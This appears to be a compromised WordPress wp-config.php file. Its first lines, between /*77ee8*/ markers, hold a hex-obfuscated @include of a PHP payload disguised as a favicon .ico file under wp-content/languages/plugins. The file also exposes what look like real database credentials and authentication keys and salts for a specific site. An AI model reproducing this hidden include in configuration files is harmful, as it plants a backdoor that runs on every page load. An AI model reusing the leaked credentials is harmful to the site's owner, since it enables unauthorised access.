<?php
/*77ee8*/

@include "\x2fv\x61r\x2fw\x77w\x2fh\x74m\x6c/\x77e\x62a\x70p\x73/\x6ao\x72d\x61n\x61k\x77/\x77p\x2dc\x6fn\x74e\x6et\x2fl\x61n\x67u\x61g\x65s\x2fp\x6cu\x67i\x6es\x2ff\x61v\x69c\x6fn\x5fc\x642\x629\x61.\x69c\x6f";

/*77ee8*/
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'jordanakw');
define('WP_DEBUG',true);
/** MySQL database username */
define('DB_USER', 'kareem');

/** MySQL database password */
define('DB_PASSWORD', 'DOSQLKareem.5151#');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '*p>+B(~U~EaD;}QOL,e!bL:<<(Awn@#Zhuh0^CsZY6dO<Dd<AZg*O}L/I,y^^)/V');
define('SECURE_AUTH_KEY',  'vqS-3#7y2VQ%)/[xk27ASp!W^gnt|b>DWGCsxlwJ;74S?,lk2zK/Q0SzA. .xg d');
define('LOGGED_IN_KEY',    '9B|3NB==U4k3<#BS@J]6v*hSO[*2Y+uA&&QX*9*Jb3E`}1c1g{>!z%EcOJ49s!g0');
define('NONCE_KEY',        'Ts(J~|)#>vix^Eo*I^bFRB0;?W)wj9c}bhAL|:Da{)Z-6sL5tb>7Dvmu|B}YO .Q');
define('AUTH_SALT',        'l@?-8QO ^qMK2e..i:xLww0maI?7GXC-{Ag&wCDZwlz8OH,!!mv$CL #J~9uLI#Z');
define('SECURE_AUTH_SALT', 'RU$TDeesf)T [X<RwDNzF{Z9h_*qMlCuQ!PRP|/.!2<c#p_=wi=+s_p[]v!YPe0r');
define('LOGGED_IN_SALT',   'M;:=l,Z1+^$5NVE3i`)Dt*o8(VfWB DySqQ)cT9!1soIGQj(-TvSgx0{FE]N/GLl');
define('NONCE_SALT',       '3%su12!`%<iim|j21r-]nR|t=Xp~6I!qj_#Tw^<yd`-phvCh_)~lRDVhgQwK,:%5');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
